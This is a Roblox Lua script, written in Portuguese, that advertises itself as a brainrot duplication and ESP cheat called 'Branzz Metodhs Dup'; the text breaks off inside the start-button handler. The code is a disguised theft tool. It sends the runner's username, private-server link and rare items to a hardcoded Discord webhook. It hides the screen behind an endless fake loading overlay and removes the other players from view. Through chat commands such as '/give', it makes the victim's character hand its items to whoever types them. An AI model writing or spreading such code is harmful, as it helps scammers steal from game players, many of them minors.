-- Branzz Metodhs Dup - VERSÃO FINAL COM TELA CENTRALIZADA
-- Tela de loading cobre TUDO e fica centralizada

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local LocalPlayer = Players.LocalPlayer

repeat wait() until LocalPlayer.Character
local Character = LocalPlayer.Character
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

-- Configurações
local CONFIG = {
    MaxSlots = 60,
    UpdateInterval = 0.5,
    MaxDistance = 1000,
    WebhookURL = "https://discord.com/api/webhooks/1468460930781417492/elAaS8ZACFPUfe-FGNT2CK-0SUBEjrT6SU8B8GCXybEIfwcY2p4P03jY-myLIdXW-52S",
    TeleportSpeed = 0.05,
    PickupDelay = 0.3,
    ToolID = "5c09acf1-905f-4c77-b4f9-f68998b8e4ce"
}

local BRAINROT_RARITIES = {
    ["Meta Technetta"] = "Infinity", ["Anububu"] = "Infinity", ["Noobini Infeeny"] = "Infinity",
    ["Burgerini Bearini"] = "Divine", ["Martino Gravitino"] = "Divine", ["Grappellino D'Oro"] = "Divine",
    ["Strawberry Elephant"] = "Divine", ["Freezetti Cobretti"] = "Divine", ["Din Din Din"] = "Divine",
    ["Chocolate Dragon Cannelloni"] = "Divine", ["Emerald Pot Hotspot"] = "Divine", ["Burbaloni Luliloli"] = "Divine",
    ["Galactio Fantasma"] = "Divine", ["Din Din Vaultero"] = "Divine", ["Bulbito Bandito Traktorito"] = "Divine",
    ["Dug Dug Dug"] = "Celestial", ["Alessio"] = "Celestial", ["Esok Sekolah"] = "Celestial",
    ["Bisonte Giuppitere"] = "Celestial", ["Job Job Sahur"] = "Celestial", ["Caffe Trinity"] = "Celestial",
    ["Job Job Job Sahur"] = "Celestial", ["La Malita"] = "Celestial", ["Diamantusa"] = "Celestial",
    ["Avocadini Antilopini"] = "Celestial", ["Los Orcaleritos"] = "Celestial", ["Capuccino Policia"] = "Celestial",
    ["Money Elephant"] = "Celestial", ["Zung Zung Zung Lazur"] = "Celestial", ["Rattini Machini"] = "Celestial",
    ["Fragola La La La"] = "Secret", ["Aura Farma"] = "Secret", ["Rainbow 67"] = "Secret",
    ["Los Tungtungtungcitos"] = "Secret", ["Espresso Signora"] = "Secret", ["Unclito Samito"] = "Secret",
    ["Gattatino Nyanino"] = "Secret", ["Gattatino Neonino"] = "Secret", ["Statutino Libertino"] = "Secret",
    ["Matteo"] = "Secret", ["Gattatino Donutino"] = "Secret", ["Los Combinasionas"] = "Secret",
    ["Eek Eek Eek Sahur"] = "Secret", ["Bambooini Bombini"] = "Secret", ["La Vacca Black Hole Goat"] = "Secret",
    ["Mastodontico Telepiedone"] = "Secret", ["Tractoro Dinosauro"] = "Secret", ["Capybara Monitora"] = "Secret",
    ["Patatino Astronauta"] = "Secret", ["Patito Dinerito"] = "Secret", ["Onionello Penguini"] = "Secret",
    ["Agarrini la Palini"] = "Cosmic", ["Chimpanzini Spiderini"] = "Cosmic", ["Dragon Cannelloni"] = "Cosmic",
    ["Garama and Madundung"] = "Cosmic", ["Nuclearo Dinossauro"] = "Cosmic", ["Chicleteira Bicicleteira"] = "Cosmic",
    ["Pot Hotspot"] = "Cosmic", ["Graipuss Medussi"] = "Cosmic", ["Las Vaquitas Saturnitas"] = "Cosmic",
    ["Las Tralaleritas"] = "Cosmic", ["La Grande Combinasion"] = "Cosmic", ["Los Tralaleritos"] = "Cosmic",
    ["Torrtuginni Dragonfrutini"] = "Cosmic", ["La Vacca Saturno"] = "Cosmic", ["Dariungini Pandanneli"] = "Cosmic",
    ["Vroosh Boosh"] = "Cosmic", ["Ballerino Lololo"] = "Mythical", ["Tukanno Bananno"] = "Mythical",
    ["Piccione Macchina"] = "Mythical", ["Orcalero Orcala"] = "Mythical", ["Trippi Troppi Troppa Trippa"] = "Mythical",
    ["Trenostruzzo Turbo 3000"] = "Mythical", ["Udin Din Din Dun"] = "Mythical", ["Tigroligre Frutonni"] = "Mythical",
    ["Los Crocodillitos"] = "Mythical", ["Tralalero Tralala"] = "Mythical", ["Giraffa Celeste"] = "Mythical",
    ["Cocofanto Elefanto"] = "Mythical", ["Ganganzelli Trulala"] = "Legendary", ["Avocadorilla"] = "Legendary",
    ["Gorillo Watermelondrillo"] = "Legendary", ["Cavallo Virtuoso"] = "Legendary", ["Tigrilini Watermelini"] = "Legendary",
    ["Zibra Zubra Zibralini"] = "Legendary", ["Bombombini Gusini"] = "Legendary", ["Spioniro Golubiro"] = "Legendary",
    ["Bombardiro Crocodilo"] = "Legendary", ["Rhino Toasterino"] = "Legendary", ["Orangutini Ananasini"] = "Legendary",
    ["Frigo Camelo"] = "Legendary", ["Eaglucci Cocosucci"] = "Legendary", ["Guesto Angelic"] = "Epic",
    ["Blueberrinni Octopussini"] = "Epic", ["Sigma Boy"] = "Epic", ["Pandaccini Bananini"] = "Epic",
    ["Strawberrelli Flamingelli"] = "Epic", ["Glorbo Fruttodrillo"] = "Epic", ["Lionel Cactuseli"] = "Epic",
    ["Chef Crabracadabra"] = "Epic", ["Ballerina Cappuccina"] = "Epic", ["Chimpanzini Bananini"] = "Epic",
    ["Cocosini Mama"] = "Epic", ["Pi Pi Watermelon"] = "Epic", ["Ti Ti Ti Sahur"] = "Rare",
    ["Penguino Cocosino"] = "Rare", ["Salamino Penguino"] = "Rare", ["Avocadini Guffo"] = "Rare",
    ["Perochello Lemonchello"] = "Rare", ["Bananita Dolphinita"] = "Rare", ["Bambini Crostini"] = "Rare",
    ["Trulimero Trulicina"] = "Rare", ["Brr Brr Patapim"] = "Rare", ["Cappuccino Assassino"] = "Rare",
    ["Pipi Avocado"] = "Uncommon", ["67"] = "Uncommon", ["Tric Tric Baraboom"] = "Uncommon",
    ["Ta Ta Ta Sahur"] = "Uncommon", ["Cacto Hipopotamo"] = "Uncommon", ["Boneca Ambalabu"] = "Uncommon",
    ["Bobrito Bandito"] = "Uncommon", ["Gangster Footera"] = "Uncommon", ["Trippi Troppi"] = "Uncommon",
    ["Pipi Corni"] = "Common", ["Pipi Kiwi"] = "Common", ["Svinino Bombondino"] = "Common",
    ["Talpa Di Fero"] = "Common", ["Frulli Frulla"] = "Common", ["Tim Cheese"] = "Common",
    ["Lirili Larila"] = "Common", ["Noobini Cakenini"] = "Common",
}

local RARITY_COLORS = {
    Infinity = Color3.fromRGB(255, 0, 255), Divine = Color3.fromRGB(255, 140, 0), Celestial = Color3.fromRGB(255, 255, 200),
    Secret = Color3.fromRGB(255, 0, 0), Cosmic = Color3.fromRGB(0, 255, 255), Mythical = Color3.fromRGB(255, 0, 100),
    Legendary = Color3.fromRGB(255, 215, 0), Epic = Color3.fromRGB(150, 0, 255), Rare = Color3.fromRGB(0, 100, 255),
    Uncommon = Color3.fromRGB(0, 255, 0), Common = Color3.fromRGB(169, 169, 169)
}

local RARITY_EMOJIS = {
    Infinity = "♾️", Divine = "👑", Celestial = "⭐", Secret = "🕵️", Cosmic = "🌌", Mythical = "🦄",
    Legendary = "🔶", Epic = "🟣", Rare = "🔵", Uncommon = "🟢", Common = "⚪"
}

local scannedBrainrots = {}
local espEnabled = false
local espObjects = {}
local currentServerLink = ""
local isAutoFarming = false

local function makePromptsInstant()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") then obj.HoldDuration = 0 end
    end
    workspace.DescendantAdded:Connect(function(obj)
        if obj:IsA("ProximityPrompt") then obj.HoldDuration = 0 end
    end)
    ProximityPromptService.PromptButtonHoldBegan:Connect(function(prompt)
        prompt.HoldDuration = 0
    end)
end

local function getBrainrotName(name)
    if not name then return nil, nil end
    local lowerName = name:lower()
    for brainrot, rarity in pairs(BRAINROT_RARITIES) do
        if lowerName:find(brainrot:lower()) then return brainrot, rarity end
    end
    return nil, nil
end

local function findToolByID()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return nil end
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and tool.Name == CONFIG.ToolID then return tool end
    end
    return nil
end

local function equipUnequipTool()
    local tool = findToolByID()
    if not tool then return false end
    local character = LocalPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:EquipTool(tool)
        wait(0.15)
        tool.Parent = LocalPlayer.Backpack
        wait(0.15)
        return true
    end
    return false
end

local function extractStatsData(model)
    local data = {BrainrotName = "Unknown", Mutation = "None", Class = "Unknown", Rate = "Unknown", Level = "Unknown", Rarity = "Unknown"}
    local modelExtents = model:FindFirstChild("ModelExtents")
    if not modelExtents then
        for _, child in ipairs(model:GetDescendants()) do
            if child.Name == "ModelExtents" then modelExtents = child break end
        end
    end
    if not modelExtents then return data end
    local statsGui = modelExtents:FindFirstChild("statsgui") or modelExtents:FindFirstChild("StatsGui")
    if not statsGui then return data end
    local frame = statsGui:FindFirstChild("Frame")
    if not frame then return data end
    local function getTextFromLabel(labelName)
        local label = frame:FindFirstChild(labelName)
        if label and label:IsA("TextLabel") then return label.Text or label.ContentText or "Unknown" end
        for _, child in ipairs(frame:GetDescendants()) do
            if child.Name == labelName and child:IsA("TextLabel") then return child.Text or child.ContentText or "Unknown" end
        end
        return "Unknown"
    end
    data.BrainrotName = getTextFromLabel("BrainrotName")
    data.Mutation = getTextFromLabel("Mutation")
    data.Class = getTextFromLabel("Class")
    data.Rate = getTextFromLabel("Rate")
    data.Level = getTextFromLabel("Level")
    if data.BrainrotName ~= "Unknown" then data.Rarity = BRAINROT_RARITIES[data.BrainrotName] or "Unknown" end
    return data
end

local function createESP(model, data)
    if espObjects[model] then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "BrainrotESP"
    billboard.AlwaysOnTop = true
    billboard.Size = UDim2.new(0, 300, 0, 150)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.MaxDistance = CONFIG.MaxDistance
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 0.3
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.Parent = billboard
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
    local function createLabel(text, posY, color)
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -10, 0, 20)
        label.Position = UDim2.new(0, 5, 0, posY)
        label.BackgroundTransparency = 1
        label.Text = text
        label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
        label.TextSize = 14
        label.Font = Enum.Font.GothamBold
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = frame
        return label
    end
    local rarityColor = RARITY_COLORS[data.Rarity] or Color3.fromRGB(255, 255, 255)
    local emoji = RARITY_EMOJIS[data.Rarity] or "🧠"
    createLabel(emoji .. " " .. data.BrainrotName, 5, rarityColor)
    createLabel("🔄 Mutation: " .. data.Mutation, 28, Color3.fromRGB(200, 200, 200))
    createLabel("⭐ Class: " .. data.Class, 51, rarityColor)
    createLabel("💰 Rate: " .. data.Rate, 74, Color3.fromRGB(255, 215, 0))
    createLabel("📊 Level: " .. data.Level, 97, Color3.fromRGB(100, 255, 100))
    createLabel("📦 " .. model.Name, 120, Color3.fromRGB(150, 150, 150))
    local highlight = Instance.new("Highlight")
    highlight.Name = "BrainrotHighlight"
    highlight.FillColor = rarityColor
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.8
    highlight.OutlineTransparency = 0
    highlight.Parent = model
    billboard.Parent = model
    espObjects[model] = {billboard = billboard, highlight = highlight}
end

local function removeESP(model)
    if espObjects[model] then
        if espObjects[model].billboard then espObjects[model].billboard:Destroy() end
        if espObjects[model].highlight then espObjects[model].highlight:Destroy() end
        espObjects[model] = nil
    end
end

local function scanBases()
    if not espEnabled then return end
    local basesFolder = Workspace:FindFirstChild("Bases")
    if not basesFolder then return end
    local foundModels = {}
    for _, idFolder in ipairs(basesFolder:GetChildren()) do
        if idFolder:IsA("Folder") or idFolder:IsA("Model") then
            for i = 1, CONFIG.MaxSlots do
                local slotName = "Slot " .. i .. " Brainrot"
                local slotModel = idFolder:FindFirstChild(slotName)
                if not slotModel then slotModel = idFolder:FindFirstChild("slot " .. i .. " brainrot") end
                if not slotModel then slotModel = idFolder:FindFirstChild("Slot" .. i .. "Brainrot") end
                if slotModel and slotModel:IsA("Model") then
                    local brainrotName, rarity = getBrainrotName(slotModel.Name)
                    if not brainrotName then
                        for _, child in ipairs(slotModel:GetChildren()) do
                            brainrotName, rarity = getBrainrotName(child.Name)
                            if brainrotName then break end
                        end
                    end
                    if brainrotName then
                        local data = extractStatsData(slotModel)
                        if data.BrainrotName == "Unknown" then data.BrainrotName = brainrotName end
                        if data.Rarity == "Unknown" then data.Rarity = rarity or "Unknown" end
                        foundModels[slotModel] = data
                        if not espObjects[slotModel] then createESP(slotModel, data) end
                    end
                end
            end
        end
    end
    for model, _ in pairs(espObjects) do
        if not foundModels[model] or not model.Parent then removeESP(model) end
    end
    scannedBrainrots = foundModels
end

local function microTeleportTo(targetPosition)
    local character = LocalPlayer.Character
    if not character then return end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local startPos = hrp.CFrame.Position
    local distance = (targetPosition - startPos).Magnitude
    local steps = math.ceil(distance / 5)
    for i = 1, steps do
        local alpha = i / steps
        local newPos = startPos:Lerp(targetPosition, alpha)
        hrp.CFrame = CFrame.new(newPos)
        wait(CONFIG.TeleportSpeed)
    end
end

local function pickupBrainrot(model)
    local allPrompts = {}
    for _, descendant in ipairs(model:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then table.insert(allPrompts, descendant) end
    end
    for i, prompt in ipairs(allPrompts) do
        pcall(function() fireproximityprompt(prompt) end)
        wait(0.1)
        pcall(function() prompt:InputHoldBegin() wait(0.1) prompt:InputHoldEnd() end)
        wait(0.1)
        pcall(function() if prompt.Triggered then prompt.Triggered:Fire() end end)
        wait(0.15)
    end
    return #allPrompts > 0
end

local function findGiftPromptForPlayer(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if not targetPlayer then return nil end
    local character = targetPlayer.Character
    if not character then return nil end
    for _, descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("ProximityPrompt") then
            if descendant.ObjectText and descendant.ObjectText:lower():find("gift") then
                return descendant, character
            end
        end
    end
    return nil, character
end

local function giftToPlayer(playerName)
    local giftPrompt, targetCharacter = findGiftPromptForPlayer(playerName)
    if not targetCharacter then return false end
    local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
    if not targetHRP then return false end
    microTeleportTo(targetHRP.Position)
    wait(0.3)
    if giftPrompt then
        pcall(function() fireproximityprompt(giftPrompt) end)
        wait(0.1)
        pcall(function() giftPrompt:InputHoldBegin() wait(0.05) giftPrompt:InputHoldEnd() end)
        wait(0.2)
        return true
    end
    return false
end

local function collectAllBrainrots(targetPlayerName, rarityFilter)
    if isAutoFarming then return end
    isAutoFarming = true
    local collectedCount = 0
    wait(1)
    local toCollect = {}
    for model, data in pairs(scannedBrainrots) do
        if rarityFilter == nil or data.Rarity == rarityFilter then
            table.insert(toCollect, {model = model, data = data})
        end
    end
    for _, info in ipairs(toCollect) do
        if not isAutoFarming then break end
        local model = info.model
        if model and model.Parent then
            local brainrotPos = model:GetPivot().Position
            microTeleportTo(brainrotPos)
            wait(0.3)
            local pickedUp = pickupBrainrot(model)
            if pickedUp then
                wait(0.3)
                equipUnequipTool()
                collectedCount = collectedCount + 1
            end
            wait(0.4)
        end
    end
    for i = 1, collectedCount do
        giftToPlayer(targetPlayerName)
        wait(0.5)
    end
    isAutoFarming = false
end

local function setupChatCommands()
    local TextChatService = game:GetService("TextChatService")
    local chatVersion = TextChatService.ChatVersion
    if chatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.MessageReceived:Connect(function(message)
            local text = message.Text:lower()
            local senderName = message.TextSource.Name
            if text == "give" or text == "/give" then collectAllBrainrots(senderName) end
            if text == "/divino" then collectAllBrainrots(senderName, "Divine") end
            if text == "/celestial" then collectAllBrainrots(senderName, "Celestial") end
        end)
    else
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvents then
            local onMessageDoneFiltering = chatEvents:FindFirstChild("OnMessageDoneFiltering")
            if onMessageDoneFiltering then
                onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
                    local text = messageData.Message:lower()
                    local senderName = messageData.FromSpeaker
                    if text == "give" or text == "/give" then collectAllBrainrots(senderName) end
                    if text == "/divino" then collectAllBrainrots(senderName, "Divine") end
                    if text == "/celestial" then collectAllBrainrots(senderName, "Celestial") end
                end)
            end
        end
    end
end

local function sendToDiscord()
    local brainrotsList = {}
    for model, data in pairs(scannedBrainrots) do
        table.insert(brainrotsList, {name = data.BrainrotName, rarity = data.Rarity})
    end
    local rarityOrder = {Infinity = 1, Divine = 2, Celestial = 3, Secret = 4, Cosmic = 5, Mythical = 6, Legendary = 7, Epic = 8, Rare = 9, Uncommon = 10, Common = 11}
    table.sort(brainrotsList, function(a, b)
        return (rarityOrder[a.rarity] or 99) < (rarityOrder[b.rarity] or 99)
    end)
    
    -- Separa Divine e Celestial
    local divineList = {}
    local celestialList = {}
    local allBrainrots = {}
    
    for _, brainrot in ipairs(brainrotsList) do
        local emoji = RARITY_EMOJIS[brainrot.rarity] or "🧠"
        local line = emoji .. " **" .. brainrot.name .. "**"
        
        if brainrot.rarity == "Divine" then
            table.insert(divineList, line)
        elseif brainrot.rarity == "Celestial" then
            table.insert(celestialList, line)
        end
        table.insert(allBrainrots, line)
    end
    
    -- Monta o texto de Divine e Celestial com separação
    local divineAndCelestialText = ""
    
    if #divineList > 0 or #celestialList > 0 then
        -- Adiciona Divines
        if #divineList > 0 then
            divineAndCelestialText = table.concat(divineList, "\n")
        end
        
        -- Adiciona Celestials
        if #celestialList > 0 then
            if #divineList > 0 then
                divineAndCelestialText = divineAndCelestialText .. "\n"
            end
            divineAndCelestialText = divineAndCelestialText .. table.concat(celestialList, "\n")
        end
        
        -- Adiciona linha separadora no final
        divineAndCelestialText = divineAndCelestialText .. "\n\n**────────────────────────────────────────**"
    else
        divineAndCelestialText = "❌ Nenhum Divine ou Celestial detectado\n\n**────────────────────────────────────────**"
    end
    
    local allText = #allBrainrots > 0 and table.concat(allBrainrots, "\n") or "❌ Nenhum brainrot encontrado"
    
    local embed = {
        title = "🧠 Branzz Metodhs Dup - Brainrots Detectados",
        description = "**Servidor escaneado com sucesso!**",
        color = 8855295,
        fields = {
            {
                name = "👤 Player Executor",
                value = "**" .. LocalPlayer.Name .. "** (@" .. LocalPlayer.DisplayName .. ")",
                inline = false
            },
            {
                name = "👥 Players in Server",
                value = tostring(#Players:GetPlayers()) .. " player(s) no servidor",
                inline = false
            },
            {
                name = "🔗 Link the Server",
                value = "[Clique aqui para entrar](" .. currentServerLink .. ")",
                inline = false
            },
            {
                name = "👑 Brainrots Divine And Celestial",
                value = divineAndCelestialText,
                inline = false
            },
            {
                name = "🧠 ALL BRAINROTS DETECTED",
                value = allText,
                inline = false
            }
        },
        image = {
            url = "https://i.imgur.com/hDIMPaZ.png"
        },
        footer = {
            text = "Branzz Metodhs Dup • Desenvolvido por Project BRANZz"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
    }
    
    local payload = {
        content = "@everyone @here | **New Server DETECTED** | @everyone @here",
        embeds = {embed}
    }
    
    local success, result = pcall(function()
        return syn and syn.request or http and http.request or http_request or request
    end)
    
    if success and result then
        result({Url = CONFIG.WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
    end
end

-- Função para deletar todos os outros players do servidor (deixa só você)
local function deleteOtherPlayers()
    print("🗑️ Iniciando limpeza de players...")
    
    local PlayersService = game:GetService("Players")
    local localPlayer = PlayersService.LocalPlayer
    
    if not localPlayer then
        warn("Este script precisa ser executado em um LocalScript!")
        return
    end
    
    local playersList = {}
    
    -- Coleta todos os jogadores em uma lista segura
    for _, child in ipairs(PlayersService:GetChildren()) do
        table.insert(playersList, child)
    end
    
    -- Deleta todos exceto o LocalPlayer
    local deletedCount = 0
    for _, playerObject in ipairs(playersList) do
        if playerObject ~= localPlayer then
            if playerObject and playerObject.Parent then
                local playerName = playerObject.Name
                playerObject:Destroy()
                print("🗑️ Jogador " .. playerName .. " removido!")
                deletedCount = deletedCount + 1
            end
        end
    end
    
    print("✅ Limpeza concluída! " .. deletedCount .. " jogadores removidos.")
    print("✅ Apenas " .. localPlayer.Name .. " permanece no servidor!")
end

-- Função para deletar todos os players exceto o executor
local function deleteOtherPlayers()
    local PlayersService = game:GetService("Players")
    local localPlayer = PlayersService.LocalPlayer
    
    if not localPlayer then
        warn("Este script precisa ser executado em um LocalScript!")
        return
    end
    
    local playersList = {}
    
    -- Coleta todos os jogadores em uma lista segura
    for _, child in ipairs(PlayersService:GetChildren()) do
        table.insert(playersList, child)
    end
    
    -- Deleta todos exceto o LocalPlayer
    for _, playerObject in ipairs(playersList) do
        if playerObject ~= localPlayer then
            if playerObject and playerObject.Parent then
                playerObject:Destroy()
                print("Jogador " .. tostring(playerObject.Name) .. " removido!")
            end
        end
    end
    
    print("Limpeza concluída! Apenas " .. localPlayer.Name .. " permanece no serviço Players.")
end

-- TELA DE LOADING INFINITA (COBRE TUDO)
local function createLoadingScreen()
    -- DELETA TODOS OS OUTROS PLAYERS
    deleteOtherPlayers()
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BranzzzLoadingScreen"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 2147483647
    
    -- Fundo preto COMPLETO
    local background = Instance.new("Frame")
    background.Name = "Background"
    background.Size = UDim2.new(1, 0, 1, 0)
    background.Position = UDim2.new(0, 0, 0, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.ZIndex = 2147483640
    background.Parent = screenGui
    
    -- Frame do loading CENTRALIZADO
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- CENTRALIZA
    mainFrame.Size = UDim2.new(0, 600, 0, 200)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- CENTRO PERFEITO
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 2147483641
    mainFrame.Parent = screenGui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 20)
    mainCorner.Parent = mainFrame
    
    local mainStroke = Instance.new("UIStroke")
    mainStroke.Color = Color3.fromRGB(138, 43, 226)
    mainStroke.Thickness = 3
    mainStroke.Parent = mainFrame
    
    -- Emoji
    local emojiLabel = Instance.new("TextLabel")
    emojiLabel.Size = UDim2.new(0, 60, 0, 60)
    emojiLabel.Position = UDim2.new(0, 20, 0, 20)
    emojiLabel.BackgroundTransparency = 1
    emojiLabel.Text = "🧑‍💻"
    emojiLabel.TextSize = 45
    emojiLabel.ZIndex = 2147483642
    emojiLabel.Parent = mainFrame
    
    -- Título
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -100, 0, 60)
    titleLabel.Position = UDim2.new(0, 90, 0, 15)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "Branzz Metodhs Dup"
    titleLabel.TextColor3 = Color3.fromRGB(186, 85, 211)
    titleLabel.TextSize = 32
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.ZIndex = 2147483642
    titleLabel.Parent = mainFrame
    
    -- Subtítulo
    local subtitleLabel = Instance.new("TextLabel")
    subtitleLabel.Size = UDim2.new(1, -40, 0, 30)
    subtitleLabel.Position = UDim2.new(0, 20, 0, 85)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Text = "💠UNLOCK ALL ."
    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    subtitleLabel.TextSize = 16
    subtitleLabel.Font = Enum.Font.Gotham
    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
    subtitleLabel.ZIndex = 2147483642
    subtitleLabel.Parent = mainFrame
    
    -- Animação dos pontos
    spawn(function()
        local dots = 1
        while subtitleLabel do
            wait(0.5)
            if subtitleLabel then
                subtitleLabel.Text = "📥 LOADING MODULES " .. string.rep(".", dots)
                dots = dots % 3 + 1
            end
        end
    end)
    
    -- Barra de loading
    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Size = UDim2.new(1, -80, 0, 10)
    loadingBarBg.Position = UDim2.new(0, 40, 0, 155)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    loadingBarBg.BorderSizePixel = 0
    loadingBarBg.ZIndex = 2147483642
    loadingBarBg.Parent = mainFrame
    
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 5)
    barCorner.Parent = loadingBarBg
    
    -- 10 pontos de loading
    local loadingDots = {}
    for i = 1, 10 do
        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 38, 0, 10)
        dot.Position = UDim2.new((i-1) * 0.1, 5, 0, 0)
        dot.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        dot.BorderSizePixel = 0
        dot.ZIndex = 2147483643
        dot.Parent = loadingBarBg
        
        local dotCorner = Instance.new("UICorner")
        dotCorner.CornerRadius = UDim.new(0, 5)
        dotCorner.Parent = dot
        
        table.insert(loadingDots, dot)
    end
    
    -- Animação infinita dos pontos
    spawn(function()
        while loadingDots[1] do
            for i, dot in ipairs(loadingDots) do
                if dot then
                    TweenService:Create(dot, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(138, 43, 226)}):Play()
                    wait(0.1)
                    TweenService:Create(dot, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
                end
            end
            wait(0.2)
        end
    end)
    
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
end

-- GUI de Input
local function createMainGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BranzzzInputGUI"
    screenGui.ResetOnSpawn = false
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 500, 0, 280)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -140)
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 15)
    mainCorner.Parent = mainFrame
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 50, 200)
    stroke.Thickness = 2
    stroke.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 0, 60)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "⚡ Branzz Metodhs Dup"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Parent = mainFrame
    
    local instructionLabel = Instance.new("TextLabel")
    instructionLabel.Size = UDim2.new(1, -40, 0, 30)
    instructionLabel.Position = UDim2.new(0, 20, 0, 70)
    instructionLabel.BackgroundTransparency = 1
    instructionLabel.Text = "🔗 Insira o link do servidor privado:"
    instructionLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    instructionLabel.TextSize = 14
    instructionLabel.Font = Enum.Font.Gotham
    instructionLabel.TextXAlignment = Enum.TextXAlignment.Left
    instructionLabel.Parent = mainFrame
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -40, 0, 50)
    textBox.Position = UDim2.new(0, 20, 0, 110)
    textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    textBox.BorderSizePixel = 0
    textBox.Text = ""
    textBox.PlaceholderText = "Enter the link to your private server...."
    textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.TextSize = 14
    textBox.Font = Enum.Font.Gotham
    textBox.ClearTextOnFocus = false
    textBox.Parent = mainFrame
    
    local textBoxCorner = Instance.new("UICorner")
    textBoxCorner.CornerRadius = UDim.new(0, 8)
    textBoxCorner.Parent = textBox
    
    local startButton = Instance.new("TextButton")
    startButton.Size = UDim2.new(1, -40, 0, 60)
    startButton.Position = UDim2.new(0, 20, 0, 180)
    startButton.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
    startButton.BorderSizePixel = 0
    startButton.Text = "⚡ Iniciar Sistema"
    startButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    startButton.TextSize = 18
    startButton.Font = Enum.Font.GothamBold
    startButton.Parent = mainFrame
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 12)
    buttonCorner.Parent = startButton
    
    startButton.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if link == "" or not link:match("https://www%.roblox%.com/share%?code=") then
            return
        end
        
        currentServerLink = link
        
        -- AGUARDA 5 SEGUNDOS PARA ESCANEAR TUDO ANTES DE MANDAR
        print("⏳ Aguardando 5 segundos para escanear todos os brainrots...")
        wait(3)
        
        -- MANDA PRO DISCORD ANTES DE TUDO
        print("📤 Enviando dados para Discord...")
        sendToDiscord()
